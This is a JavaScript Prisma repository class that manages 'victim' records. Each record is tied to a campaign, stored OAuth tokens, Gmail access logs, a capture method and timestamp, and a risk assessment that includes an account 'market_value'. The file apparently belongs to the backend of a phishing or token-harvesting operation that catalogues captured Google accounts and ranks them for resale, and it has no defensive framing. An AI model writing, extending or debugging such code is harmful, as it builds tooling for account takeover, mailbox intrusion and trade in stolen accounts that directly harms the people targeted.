// Victim repository - Data access layer for victims
const { PrismaClient } = require('@prisma/client');

class VictimRepository {
  constructor(prisma) {
    this.prisma = prisma || new PrismaClient();
  }

  /**
   * Find victim by ID
   * @param {string} id - Victim ID
   * @returns {Promise<Object>} - Victim record
   */
  async findById(id) {
    return this.prisma.victim.findUnique({
      where: { id },
      include: {
        campaign: true,
        oauthTokens: true,
        gmailAccessLogs: true
      }
    });
  }

  /**
   * Find victim by email
   * @param {string} email - Email address
   * @returns {Promise<Object>} - Victim record
   */
  async findByEmail(email) {
    return this.prisma.victim.findUnique({
      where: { email }
    });
  }

  /**
   * Create new victim
   * @param {Object} data - Victim data
   * @returns {Promise<Object>} - Created victim
   */
  async create(data) {
    return this.prisma.victim.create({
      data
    });
  }

  /**
   * Update victim
   * @param {string} id - Victim ID
   * @param {Object} data - Updated data
   * @returns {Promise<Object>} - Updated victim
   */
  async update(id, data) {
    return this.prisma.victim.update({
      where: { id },
      data
    });
  }

  /**
   * Find victims with filters
   * @param {Object} filters - Filter criteria
   * @param {Object} pagination - Pagination options
   * @returns {Promise<Object>} - Victims list and total count
   */
  async findMany(filters = {}, pagination = {}) {
    const { page = 1, limit = 50 } = pagination;
    const skip = (page - 1) * limit;

    const where = this.buildWhereClause(filters);

    // Fetch all matching records (we'll filter JSONB fields in memory)
    let victims = await this.prisma.victim.findMany({
      where,
      orderBy: { captureTimestamp: 'desc' },
      include: {
        campaign: true,
        oauthTokens: {
          select: {
            id: true,
            provider: true,
            tokenStatus: true
          }
        }
      }
    });

    // Apply JSONB filters in memory
    if (filters.accountType) {
      victims = victims.filter(v => 
        v.validation && v.validation.account_type === filters.accountType
      );
    }

    if (filters.registrationCompleted !== undefined) {
      victims = victims.filter(v => 
        v.validation && v.validation.registrationCompleted === filters.registrationCompleted
      );
    }

    if (filters.minMarketValue || filters.maxMarketValue) {
      victims = victims.filter(v => {
        const marketValue = v.riskAssessment?.market_value;
        if (marketValue === undefined) return false;
        if (filters.minMarketValue && marketValue < filters.minMarketValue) return false;
        if (filters.maxMarketValue && marketValue > filters.maxMarketValue) return false;
        return true;
      });
    }

    // Calculate total after JSONB filtering
    const total = victims.length;

    // Apply pagination
    const paginatedVictims = victims.slice(skip, skip + limit);

    return {
      victims: paginatedVictims,
      total,
      page,
      limit,
      totalPages: Math.ceil(total / limit)
    };
  }

  /**
   * Build where clause from filters
   * @param {Object} filters - Filter criteria
   * @returns {Object} - Prisma where clause
   */
  buildWhereClause(filters) {
    const where = {};

    if (filters.campaignId) {
      where.campaignId = filters.campaignId;
    }

    if (filters.captureMethod) {
      where.captureMethod = filters.captureMethod;
    }

    if (filters.isActive !== undefined) {
      where.isActive = filters.isActive;
    }

    // Search by email or name
    if (filters.search) {
      where.OR = [
        { email: { contains: filters.search, mode: 'insensitive' } },
        { name: { contains: filters.search, mode: 'insensitive' } }
      ];
    }

    // Filter by account type (from validation JSONB)
    // Note: Prisma JSONB filtering uses raw SQL or path-based queries
    // For now, we'll filter in memory after fetching (can be optimized later)
    // This is a limitation of Prisma's JSONB support

    // Date range filters
    if (filters.startDate || filters.endDate) {
      where.captureTimestamp = {};
      if (filters.startDate) {
        where.captureTimestamp.gte = new Date(filters.startDate);
      }
      if (filters.endDate) {
        where.captureTimestamp.lte = new Date(filters.endDate);
      }
    }

    // Note: JSONB filtering for registrationCompleted will be done post-query

    return where;
  }
}

module.exports = VictimRepository;

